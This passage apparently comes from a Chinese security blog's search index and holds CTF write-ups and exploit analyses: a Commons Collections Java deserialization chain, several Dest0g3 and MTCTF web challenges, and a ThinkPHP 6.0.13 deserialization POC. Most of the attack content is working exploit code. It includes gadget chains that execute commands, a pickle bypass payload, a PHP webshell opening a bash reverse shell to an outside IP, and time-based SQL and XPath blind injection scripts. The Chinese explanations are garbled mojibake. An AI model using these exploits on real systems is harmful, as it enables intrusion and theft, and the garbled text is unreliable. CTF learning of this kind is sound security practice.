java.util.Map;public class CommonsCollections11 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException { Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map lazymap = LazyMap.decorate(hashMap, invokerTransformer); Class&lt;LazyMap&gt; lazyClass = LazyMap.class; Method getMethod = lazyClass.getMethod(&quot;get&quot;, Object.class); getMethod.invoke(lazymap, runtime); }} å¯ä»¥æ‰§è¡Œï¼Œæˆ‘ä»¬ç»§ç»­å‘ä¸Šèµ°ï¼Œçœ‹è°è°ƒç”¨äº†getæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬æ‰¾åˆ°äº†AnnotationInvocationHandlerçš„invoke() æ–¹æ³• æ°å·§è¿™ä¸ªç±»é‡Œä¹Ÿæœ‰readObjectæ–¹æ³• ä½†é—®é¢˜æ˜¯ï¼Œæˆ‘ä»¬æ€ä¹ˆæ ·è§¦å‘è¿™ä¸ªinvokeæ–¹æ³•ï¼Œè¿™é‡Œå°±è¦æœ‰ä¹‹å‰å†™è¿‡çš„åŠ¨æ€ä»£ç†çš„çŸ¥è¯†ï¼Œ ä¸€ä¸ªç±»è¢«åŠ¨æ€ä»£ç†äº†ä¹‹åï¼Œæƒ³è¦é€šè¿‡ä»£ç†è°ƒç”¨è¿™ä¸ªç±»çš„æ–¹æ³•ï¼Œå°±ä¸€å®šä¼šè°ƒç”¨ invoke() æ–¹æ³•ã€‚ æˆ‘ä»¬æ‰¾åˆ°ä¹‹å‰çš„entrySet()æ–¹æ³•ï¼Œå¦‚æœæˆ‘ä»¬æŠŠmemberValues æ”¹ä¸ºä»£ç†å¯¹è±¡ï¼Œå½“å®ƒè°ƒç”¨entrySetçš„æ—¶å€™ï¼Œå°±ä¸€å®šä¼šè°ƒç”¨invokeæ–¹æ³•ã€‚ç„¶åå®Œæˆè¿™æ¡é“¾çš„åˆ©ç”¨ æˆ‘ä»¬æ‹¿ä¸ŠèŠ‚çš„POCæ¥åˆ†æ è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬è¦ä»£ç†çš„å®ä¾‹ Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, decorateMap); ç„¶åç”Ÿæˆä»£ç†ç±» Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler); invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); æœ€ç»ˆçš„POC import org.apache.commons.collections.Transformer;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.LazyMap;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.*;import java.util.HashMap;import java.util.Map;public class CommonsCollections11 { public static void main(String[] args) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException, IOException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;value&quot;, &quot;qqw&quot;); Map decorateMap = LazyMap.decorate(hashMap, chainedTransformer); Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, decorateMap); Map proxyMap = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, invocationHandler); invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap); serialize(invocationHandler); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; }} æœ€åå†æ”¾ä¸€ä¸‹soserialçš„é“¾å­å›¾ æ€»ç»“ å†å»ç†è§£ä¸‹javaçš„åå°„æœºåˆ¶ å¤šçœ‹çœ‹å…¶ä»–å¸ˆå‚…çš„åˆ†ææ–‡ç«  ååºåˆ—åŒ–çš„çŸ¥è¯† åŠ¨æ€ä»£ç†æœºåˆ¶","link":"/2022/11/06/CC11/"},{"title":"Dest0g3 520è¿æ–°èµ›","text":"Webéƒ¨åˆ† WriteUp phpdestæ‰“å¼€ç»™äº†æºç  &lt;?phphighlight_file(__FILE__);require_once 'flag.php';if(isset($_GET['file'])) { require_once($_GET['file']);} ä¸éš¾æ³¨æ„åˆ°ï¼Œæ¼æ´ç‚¹åº”è¯¥æ˜¯å‡ºåœ¨require_onceï¼Œæœç´¢å‘ç°å¦‚ä¸‹æ–‡ç«  https://www.anquanke.com/post/id/213235 payload php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php EasyPHPåŒæ ·ç»™äº†æºç  &lt;?phphighlight_file(__FILE__);include &quot;fl4g.php&quot;;$dest0g3 = $_POST['ctf'];$time = date(&quot;H&quot;);$timme = date(&quot;d&quot;);$timmme = date(&quot;i&quot;);if(($time &gt; &quot;24&quot;) or ($timme &gt; &quot;31&quot;) or ($timmme &gt; &quot;60&quot;)){ echo $fl4g;}else{ echo &quot;Try harder!&quot;;}set_error_handler( function() use(&amp;$fl4g) { print $fl4g; });$fl4g .= $dest0g3;?&gt; ç®€å•åˆ†æä¸‹å¯ä»¥å‘ç°ï¼Œåªè¦è§¦å‘set_error_handlerå°±å¯ä»¥è·å¾—flag å› ä¸ºä¸‹é¢æœ‰ä¸ªå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œä¼ å…¥æ•°ç»„å³å¯æŠ¥é”™ï¼Œè§¦å‘è¿™ä¸ªå‡½æ•° SimpleRCEè¿˜æ˜¯ç»™æºç ï¼Œå¯ä»¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ &lt;?phphighlight_file(__FILE__);$aaa=$_POST['aaa'];$black_list=array('^','.','`','&gt;','&lt;','=','&quot;','preg','&amp;','|','%0','popen','char','decode','html','md5','{','}','post','get','file','ascii','eval','replace','assert','exec','$','include','var','pastre','print','tail','sed','pcre','flag','scan','decode','system','func','diff','ini_','passthru','pcntl','proc_open','+','cat','tac','more','sort','log','current','\\\\','cut','bash','nl','wget','vi','grep');$aaa = str_ireplace($black_list,&quot;hacker&quot;,$aaa);eval($aaa);?&gt; è€ƒè™‘åˆ°è¿‡æ»¤äº†è¿™ä¹ˆå¤šç©æ„ï¼Œç¬¬ä¸€ä¸ªæƒ³åˆ°çš„å°±æ˜¯æ— å­—æ¯æ•°å­—ç»•è¿‡æ­£åˆ™ å‚è€ƒyuå¸ˆå‚…è¿™ç¯‡æ–‡ç« https://blog.csdn.net/miuzzx/article/details/109143413?spm=1001.2014.3001.5502 funny_uploadå­¦ä¹ åˆ°äº†.htaccessçš„æ–°ç”¨æ³•ï¼Œä»¥åŠé…åˆä¼ªåè®®ç»•è¿‡å†…å®¹è¿‡æ»¤ é¦–å…ˆåˆ©ç”¨base64ç¼–ç ç»•è¿‡å†…å®¹è¿‡æ»¤ ç„¶å.htaccessè§£æé…åˆä¼ªåè®®è¯»å– Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;.htaccess&quot;Content-Type: image/jpegSetHandler application/x-httpd-phpphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=lnk.jpg&quot; ä½†æ˜¯æ‰§è¡Œå‘½ä»¤çš„æ—¶å€™å‘ç°ï¼Œæ²¡æœ‰å›æ˜¾ï¼Œè€ƒè™‘åˆ°disable_functionè¿‡æ»¤äº† åˆ©ç”¨file_get_contents çŒœæµ‹flagä¹Ÿåœ¨æ ¹ç›®å½• EasySSTIç™»å½•è¿›å»åï¼Œusernameå¤„å›æ˜¾ï¼Œæ ¹æ®é¢˜ç›®ï¼Œè¯•è¯•ssti æˆåŠŸï¼Œä½†æ˜¯ç®€å•fuzzäº†ä¸€ä¸‹ï¼ŒåŸºæœ¬ä¸Šä¸€äº›å¸¸è§çš„å…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†ï¼ŒåŒ…æ‹¬. ' &quot; [ _è¿˜æœ‰ç©ºæ ¼ çœ‹äº†wpçŸ¥é“åˆ©ç”¨setå¯ä»¥å¾—åˆ°å…³é”®å­—ç»•è¿‡ pocæ˜¯ä¸€æ ·çš„ï¼Œä¸è¿‡burpè¦å‘ä¸¤æ¬¡åŒ…ï¼Œç¬¬ä¸€æ¬¡è®¾ç½®å˜é‡ï¼Œä¼šå¯¼è‡´500çš„æŠ¥é”™ï¼Œç¬¬äºŒæ¬¡å°±å‡ºflagï¼Œå…¶ä¸­ç©ºæ ¼ç”¨%0aç»•è¿‡ä¸€ä¸‹ middlepickleååºåˆ—åŒ–ï¼Œä½†æ˜¯é™åˆ¶äº†åªæœ‰configç±»ï¼Œä»¥åŠè°ƒç”¨çš„å±æ€§æ–¹æ³•ä¸­ä¸åŒ…å«__ import osimport configfrom flask import Flask, request, session, render_template, url_for,redirect,make_responseimport pickleimport ioimport sysimport base64app = Flask(__name__)class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module in ['config'] and &quot;__&quot; not in name: return getattr(sys.modules[module], name) raise pickle.UnpicklingError(&quot;global '%s.%s' is forbidden&quot; % (module, name))def restricted_loads(s): return RestrictedUnpickler(io.BytesIO(s)).load()@app.route('/')def show(): base_dir = os.path.dirname(__file__) resp = make_response(open(os.path.join(base_dir, __file__)).read()+open(os.path.join(base_dir, &quot;config/__init__.py&quot;)).read()) resp.headers[&quot;Content-type&quot;] = &quot;text/plain;charset=UTF-8&quot; return resp@app.route('/home', methods=['POST', 'GET'])def home(): data=request.form['data'] User = restricted_loads(base64.b64decode(data)) return str(User)if __name__ == '__main__': app.run(host='0.0.0.0', debug=True, port=5000)import osdef backdoor(cmd): # è¿™é‡Œæˆ‘ä¹Ÿæ”¹äº†ä¸€ä¸‹ if isinstance(cmd,list) : s=''.join(cmd) print(&quot;!!!!!!!!!!&quot;) s=eval(s) return s else: print(&quot;??????&quot;) ä½†æ˜¯ç»™äº†ä¸€ä¸ªbackdooråé—¨å‡½æ•°ï¼Œæˆ‘ä»¬ç”¨pkeræ„é€ ä¸€ä¸‹ cfbk = GLOBAL('config', 'backdoor')cfbk([&quot;__import__('os').popen('cat /flag.txt').read()&quot;])return å¯ä»¥æ‰§è¡Œå‘½ä»¤ ezipå›¾ç‰‡é‡Œè—ç€æºç  upload.php:&lt;?phperror_reporting(0);include(&quot;zip.php&quot;);if(isset($_FILES['file']['name'])){ if(strstr($_FILES['file']['name'],&quot;..&quot;)||strstr($_FILES['file']['name'],&quot;/&quot;)){ echo &quot;hacker!!&quot;; exit; } if(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION)!=&quot;zip&quot;){ echo &quot;only zip!!&quot;; exit; } $Myzip = new zip($_FILES['file']['name']); mkdir($Myzip-&gt;path); move_uploaded_file($_FILES['file']['tmp_name'], './'.$Myzip-&gt;path.'/' . $_FILES['file']['name']); echo &quot;Try to unzip your zip to /&quot;.$Myzip-&gt;path.&quot;&lt;br&gt;&quot;; if($Myzip-&gt;unzip()){echo &quot;Success&quot;;}else{echo &quot;failed&quot;;}}zip.php:&lt;?phpclass zip{ public $zip_name; public $path; public $zip_manager; public function __construct($zip_name){ $this-&gt;zip_manager = new ZipArchive(); $this-&gt;path = $this-&gt;gen_path(); $this-&gt;zip_name = $zip_name; } public function gen_path(){ $chars=&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;; $newchars=str_split($chars); shuffle($newchars); $chars_key=array_rand($newchars,15); $fnstr = &quot;&quot;; for($i=0;$i&lt;15;$i++){ $fnstr.=$newchars[$chars_key[$i]]; } return md5($fnstr.time().microtime()*100000); } public function deldir($dir) { //å…ˆåˆ é™¤ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼š $dh = opendir($dir); while ($file = readdir($dh)) { if($file != &quot;.&quot; &amp;&amp; $file!=&quot;..&quot;) { $fullpath = $dir.&quot;/&quot;.$file; if(!is_dir($fullpath)) { unlink($fullpath); } else { $this-&gt;deldir($fullpath); } } } closedir($dh); } function dir_list($directory) { $array = []; $dir = dir($directory); while ($file = $dir-&gt;read()) { if ($file !== '.' &amp;&amp; $file !== '..') { $array[] = $file; } } return $array; } public function unzip() { $fullpath = &quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$this-&gt;zip_name; $white_list = ['jpg','png','gif','bmp']; $this-&gt;zip_manager-&gt;open($fullpath); for ($i = 0;$i &lt; $this-&gt;zip_manager-&gt;count();$i ++) { if (strstr($this-&gt;zip_manager-&gt;getNameIndex($i),&quot;../&quot;)){ echo &quot;you bad bad&quot;; return false; } } if(!$this-&gt;zip_manager-&gt;extractTo($this-&gt;path)){ echo &quot;Unzip to /&quot;.$this-&gt;path.&quot;/ failed&quot;; exit; } @unlink($fullpath); $file_list = $this-&gt;dir_list(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;); for($i=0;$i&lt;sizeof($file_list);$i++){ if(is_dir($this-&gt;path.&quot;/&quot;.$file_list[$i])){ echo &quot;dir? I deleted all things in it&quot;.&quot;&lt;br&gt;&quot;;@$this-&gt;deldir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);@rmdir(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]); } else{ if(!in_array(pathinfo($file_list[$i], PATHINFO_EXTENSION),$white_list)) {echo &quot;only image!!! I deleted it for you&quot;.&quot;&lt;br&gt;&quot;;@unlink(&quot;/var/www/html/&quot;.$this-&gt;path.&quot;/&quot;.$file_list[$i]);} } } return true; }} é€šè¿‡å‡ºå‘unzipçš„æŠ¥é”™ï¼Œå¯ä»¥æ‰§è¡Œphpä»£ç  é¦–å…ˆå†™å…¥ä¸€ä¸ªwebshell &lt;?php system(&quot;bash -c 'bash -i &gt;&amp; /dev/tcp/121.xxx.xxx.xxx/2333 0&gt;&amp;1'&quot;);?&gt; ç„¶å ä¸Šä¼ è®¿é—®ï¼Œå¾—åˆ°åå¼¹å›æ¥çš„shell å°è¯•suidææƒï¼Œå¯ä»¥åˆ©ç”¨nlå‘½ä»¤ Really Easy SQLé’“é±¼ç«™ï¼Œå¯èƒ½å°±æ˜¯çº¯ç²¹ç”¨æ¥è®°å½•çš„ï¼Œinsertæ³¨å…¥ hintç»™äº†é»‘åå• $black_list=array('union','updatexml','order','by','substr',' ','and','extractvalue',';','sleep','join','alter','handler','char','+','/','like','regexp','offset','sleep','case','&amp;','-','hex','%0','loadâ€™); åˆ©ç”¨benchmarkä»£æ›¿sleepï¼Œ%0aä»£æ›¿ç©ºæ ¼ import timeimport requests# $black_list=array('union','updatexml','order','by','substr',' ','and','extractvalue',';','sleep','join','alter','handler','char','+','/','like','regexp','offset','sleep','case','&amp;','-','hex','%0','loadâ€™);url = &quot;http://2f597fa9-55a9-4661-abfb-d700be2f5a7c.node4.buuoj.cn:81/index.php&quot;string = [ord(i) for i in 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789,{}-']res = ''for i in range(1, 60): for j in string: time.sleep(1) #payload = f&quot;username='or(if((ascii(right((select%a0group_concat(schema_name)%a0from%a0information_schema.schemata),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit=&quot; #payload = f&quot;username='or(if((ascii(right((select%a0group_concat(table_name)%a0from%a0information_schema.tables%a0where%a0table_schema='ctf'),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit=&quot; #payload = f&quot;username='or(if((ascii(right((select%a0group_concat(column_name)%a0from%a0information_schema.columns%a0where%a0table_name='flaggg'),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit=&quot; payload = f&quot;username='or(if((ascii(right((select%a0group_concat(cmd)%a0from%a0ctf.flaggg),{i}))='{j}'),(benchmark(2999999,md5('test'))),0))or'&amp;password=a&amp;submit=&quot; try: headers = {'Content-Type':'application/x-www-form-urlencoded'} requests.post(url=url, data=payload, headers=headers, timeout=1.5) except: res = chr(j)+res print(res) break Easy SQLå’Œä¸Šä¸€é¢˜ä¸€æ ·çš„","link":"/2022/05/30/Dest0g3/"},{"title":"MTCTF2022","text":"å‘¨æœ«æ‰“çš„MTCTF easypickleåˆæ˜¯pickleï¼Œä¸Šæ¬¡å­¦çš„å¿˜å¾—å·®ä¸å¤šäº†ï¼Œå¹³æ—¶åŸºæœ¬ä¸Šæ²¡ç¢°åˆ°è¿‡ ç»™äº†æºç  import base64import picklefrom flask import Flask, sessionimport osimport randomapp = Flask(__name__)app.config['SECRET_KEY'] = os.urandom(2).hex()@app.route('/')def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices(&quot;admin&quot;, k=5)) return 'Hello {}!'.format(session['user'])@app.route('/admin')def admin(): if session.get('user') != &quot;admin&quot;: return f&quot;&lt;script&gt;alert('Access Denied');window.location.href='/'&lt;/script&gt;&quot; else: try: a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;) pickle.loads(base64.b64decode(session.get('ser_data'))) return &quot;ok&quot; except: return &quot;error!&quot;if __name__ == '__main__': app.run(host='0.0.0.0', port=8888) é¦–å…ˆæ˜¯è¿™ä¸ªsecret_keyæ˜¯ä¸€ä¸ª4ä½çš„åå…­è¿›åˆ¶ ç„¶åä¸‹é¢è¿™ä¸ªè·¯ç”± @app.route('/')def hello_world(): if not session.get('user'): session['user'] = ''.join(random.choices(&quot;admin&quot;, k=5)) return 'Hello {}!'.format(session['user']) å¦‚æœæ²¡æœ‰sessionï¼Œå°±ä»adminä¸­å–ï¼Œè¿™é‡Œå‚è€ƒå›¢é˜Ÿå¸ˆå‚…çš„è„šæœ¬ï¼Œçˆ†å‡ºadminçš„cookie import requestsurl = &quot;http://127.0.0.1:5000/&quot;while True: resp = requests.get(url=url) if &quot;admin&quot; in resp.text: print(resp.cookies) break ç„¶åæˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨flask-unsignè¿›è¡Œå¯¹keyçš„çˆ†ç ´ é¦–å…ˆå…ˆç”Ÿæˆä¸€ä¸‹å­—å…¸ hexs = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f']with open(&quot;./1.txt&quot;, &quot;a&quot;) as f: for i in hexs: for j in hexs: for m in hexs: for n in hexs: str = &quot;{}{}{}{}\\n&quot;.format(i, j, m, n) print(str) f.write(str) æ¥ç€å°±æ˜¯è¦ç»•è¿‡ååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤äº† a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;) if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;) pickle.loads(base64.b64decode(session.get('ser_data'))) è¿™ä¸ªser_dataæ˜¯ä»sessioné‡Œå–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¼ªé€ sessionä¼ å…¥pcikleååºåˆ—åŒ–çš„æ•°æ®ï¼ŒåŒæ—¶ä»–ä¹Ÿé™åˆ¶äº†R i o bå››ä¸ªæ“ä½œç¬¦ æ³¨æ„çœ‹ï¼Œä»–è¿™é‡Œæœ€åloadçš„æ˜¯ser_dataï¼Œè€Œä¸æ˜¯a æ‰€ä»¥è¿™ä¸ªwafçš„é€»è¾‘æ˜¯æœ‰é—®é¢˜çš„ å…ˆç”¨aå»è·å¾—æ›¿æ¢å…³é”®å­—çš„opcode ç„¶åæ›¿æ¢åçš„å»åˆ¤æ–­ ä½†æ˜¯æœ€åæ‰§è¡Œçš„å´æ˜¯åŸå…ˆçš„å€¼ æˆ‘ä»¬åˆ©ç”¨å¦‚ä¸‹payload import base64import pickletoolspayload = b'''(S'key'\\nS'val'\\ndS'pay'\\n(cos\\nsystem\\nVåå¼¹shell\\nos.'''print(pickletools.dis(payload))print(base64.b64encode(payload)) æ‰§è¡Œå‘½ä»¤é€‰ç”¨çš„æ˜¯åå¼¹shellï¼Œç„¶åå› ä¸ºæœ‰wafï¼Œæˆ‘ä»¬å¯ä»¥é‡‡ç”¨VæŒ‡ä»¤ï¼Œè¿›è¡Œunicodeç¼–ç ç»•è¿‡ å‘åŒ…è¿‡å»ï¼ŒæˆåŠŸæ”¶åˆ°shell babyjavaxpathç›²æ³¨ï¼Œè¿™é‡Œæœ¬åœ°æ²¡ç¯å¢ƒäº†ï¼Œè´´ä¸‹å…¶ä»–å¸ˆå‚…çš„è„šæœ¬ https://pysnow.cn/archives/394/ # -*- coding: utf-8 -*-# @Time : 2022/9/17 14:00# @Author : pysnowimport stringimport requestsurl = 'http://eci-2ze1m6bqazd6qr453ll7.cloudeci1.ichunqiu.com:8888/hello'dic = 'flagbcdef-_{}0123456789'ses = requests.session()result = ''# data = {&quot;xpath&quot;: &quot;admin' or substring(name(/root/user), &quot; + str(i) + &quot;, 1)='&quot; + j}# root user username# /root/user/for i in range(29, 50): print(i) for j in dic: data = {&quot;xpath&quot;: &quot;admin' or substring((/root/user/*[2]), &quot; + str(i) + &quot;, 1)='&quot; + j} res = ses.post(url=url, data=data) if 'available' not in res.text: result += j print(result) break https://mp.weixin.qq.com/s/JuR0OL4Wv9SLCVFd71vuKA import requests as resimport stringurl = &quot;http://eci-2zeetzz54w4b5tinoysb.cloudeci1.ichunqiu.com:8888/hello&quot;strs = &quot;{-}&quot; + string.ascii_letters + string.digits result = &quot;&quot;end = Falsefor a in range(1,100): if end: print(&quot;[+]Done!: {}&quot;.format(result)) break for i in strs: print(&quot;[+]Test:{} {}&quot;.format(a,i)) # data = {&quot;xpath&quot; : &quot;1'or substring(name(/*[1]), {}, 1)='{}' and '1'='1&quot;.format(a,i)} # data = {&quot;xpath&quot; : &quot;1'or substring(name(/root/*[1]), {}, 1)='{}' and '1'='1&quot;.format(a,i)} # data = {&quot;xpath&quot; : &quot;1'or substring(name(/root/user/*[2]), {}, 1)='{}' and '1'='1&quot;.format(a,i)} data = {&quot;xpath&quot; : &quot;1'or substring(/root/user/username[position()=2]/text(), {}, 1)='{}' and '1'='1&quot;.format(a,i)} resp = res.post(url=url, data=data) # print(resp.text) if resp.text.find(&quot;&lt;p&gt;user1&lt;/p&gt;&quot;) != -1: result += i print(&quot;[+]Matched: &quot; + result) break if i == strs[len(strs)-1:]: end = True","link":"/2022/09/20/MTCTF/"},{"title":"TP6.0.13ååºåˆ—åŒ–ç®€å•åˆ†æ","text":"çœ‹åˆ°æœ€æ–°çš„TPçˆ†äº†ä¸€ä¸ªååºåˆ—åŒ–çš„RCEï¼Œçœ‹ç€ZACå¸ˆå‚…æ–‡ç« åˆ†æä¸€ä¸‹ å‡†å¤‡åŸå§‹POCé“¾æ¥https://github.com/top-think/framework/issues/2749 ä¸‹ä¸€ä¸‹æºç  composer create-project topthink/think tp è¿™æ¬¡ç”¨Phpstormæ¥è°ƒè¯•åˆ†æï¼Œé…ç½®æ•™ç¨‹ä¾ç„¶å‚è€ƒå›½å…‰å¸ˆå‚…çš„ã€‚ é‡‡å–POC+åŠ¨è°ƒ åˆ†æå…ˆä¸ŠPOC &lt;?phpnamespace League\\Flysystem\\Cached\\Storage{ class Psr6Cache{ private $pool; protected $autosave = false; public function __construct($exp) { $this-&gt;pool = $exp; } }}namespace think\\log{ class Channel{ protected $logger; protected $lazy = true; public function __construct($exp) { $this-&gt;logger = $exp; $this-&gt;lazy = false; } }}namespace think{ class Request{ protected $url; public function __construct() { $this-&gt;url = '&lt;?php system(\\'open /System/Applications/Calculator.app\\'); exit(); ?&gt;'; } } class App{ protected $instances = []; public function __construct() { $this-&gt;instances = ['think\\Request'=&gt;new Request()]; } }}namespace think\\view\\driver{ class Php{}}namespace think\\log\\driver{ class Socket{ protected $config = []; protected $app; protected $clientArg = []; public function __construct() { $this-&gt;config = [ 'debug'=&gt;true, 'force_client_ids' =&gt; 1, 'allow_client_ids' =&gt; '', 'format_head' =&gt; [new \\think\\view\\driver\\Php,'display'], # åˆ©ç”¨ç±»å’Œæ–¹æ³• ]; $this-&gt;app = new \\think\\App(); $this-&gt;clientArg = ['tabid'=&gt;'1']; } }}namespace{ $c = new think\\log\\driver\\Socket(); $b = new think\\log\\Channel($c); $a = new League\\Flysystem\\Cached\\Storage\\Psr6Cache($b); echo urlencode(serialize($a));} æŠŠè¿™ä¸ªå°ç”µè¯å¼€å¯ï¼Œæˆ‘ä»¬ç›´æ¥æ‰“å…¥POCï¼Œæ–­ç‚¹æ–­åœ¨__destructæ–¹æ³•é‡Œ ç„¶åæˆ‘ä»¬å•æ­¥è·Ÿè¿›saveæ–¹æ³• è¿™é‡Œçš„poolç°åœ¨æ˜¯Channelç±»ï¼Œç„¶åè°ƒç”¨getItemæ–¹æ³•ï¼Œæˆ‘ä»¬è·Ÿè¿›ä¼šå‘ç°ï¼ŒChannelç±»ä¸­æ²¡æœ‰getItemæ–¹æ³•ï¼Œæ‰€ä»¥ä¼šè°ƒç”¨__callæ–¹æ³• æ¥ç€å°±æ˜¯è°ƒç”¨logï¼Œç„¶ålogåˆè°ƒç”¨recordï¼Œç„¶åè·Ÿè¿›å‘ç°å®ƒåˆè°ƒç”¨ä¸€ä¸ªsave æ­¤æ—¶æˆ‘ä»¬çœ‹åˆ°ï¼Œloggeræ˜¯æŒ‡å‘Socketç±»ï¼Œè€Œåè°ƒç”¨saveä¹Ÿå°±æ˜¯Socketä¸­çš„saveæ–¹æ³• ç„¶åå°±ä¸€è·¯è·Ÿï¼Œä¸€ç›´åˆ°requestè°ƒç”¨urlè§£æäº†æˆ‘ä»¬æ‰§è¡Œçš„å‘½ä»¤ï¼Œå…¶ä¸­http://æ˜¯é€šè¿‡domainå’Œschemeå‡½æ•°å¾—åˆ°çš„ ç„¶åæ‰§è¡Œåˆ°äº†invokeMethod è·Ÿè¿›åï¼Œreflectè¢«ä¼ å…¥ç±»Phpï¼Œæ–¹æ³•æ˜¯displayï¼Œç„¶åè°ƒç”¨invokeArgsæ–¹æ³• è¿™ä¸ªinvokeArgså¯ä»¥å¸¦å‚æ•°æ‰§è¡Œ æ‰€ä»¥ç»§ç»­è·Ÿè¿›ï¼Œå®ƒå°±ä¼šå»æ‰§è¡ŒPhpç±»ä¸­çš„displayæ–¹æ³• æ‰§è¡Œå®Œï¼ŒæˆåŠŸå¼¹å‡ºäº†è®¡ç®—å™¨ è¿™ä¸ç®—æ˜¯å¤ç°è¿™æ¡é“¾å­ï¼Œä¸»è¦æ˜¯ç†Ÿæ‚‰ä¸‹è°ƒè¯•æµç¨‹ï¼Œåˆ†æä»£ç æ‰§è¡Œè¿‡ç¨‹ã€‚","link":"/2022/09/24/TP6013/"},{"title":"Thinkphp5.1.xååºåˆ—åŒ–å­¦ä¹ ","text":"å‰è¨€æ˜¯NU1Lé‚£æœ¬ä¹¦é…å¥—çš„ä¸€é“é¢˜ï¼Œåœ¨BUUä¸Šæœ‰ï¼Œé“¾æ¥ä¸‹è½½ä¸‹æ¥å°±æ˜¯Thinkphp5.1çš„æºç ï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šå¯¹åº”çš„POCä»¥åŠåˆ†æï¼Œåˆšå¥½æœ€è¿‘ä¹Ÿæ˜¯åœ¨å­¦ä¹ ä»£ç å®¡è®¡ï¼Œä»¥å‰æ²¡æœ‰å¤ç°è¿‡è¿™ä¹ˆéš¾çš„ï¼Œè¿™æ¬¡å°±æŠ±ç€å­¦ä¹ çš„å¿ƒæ€æ¥å°è¯•ä¸€ä¸‹ã€‚ ç›¸å…³ç¯å¢ƒé…ç½®å› ä¸ºä¹‹å‰ä¹Ÿæ²¡å’‹å®¡è®¡è¿‡ä»£ç ï¼Œæ‰€ä»¥è¿™æ¬¡å°±é¡ºä¾¿æŠŠç¯å¢ƒä¹Ÿä¸€èµ·é…å¥½äº†ï¼Œæ–¹ä¾¿ä»¥åå­¦ä¹ ã€‚è¿™é‡Œæˆ‘æ˜¯å‚è€ƒå›½å…‰å¸ˆå‚…çš„é…ç½® macOS 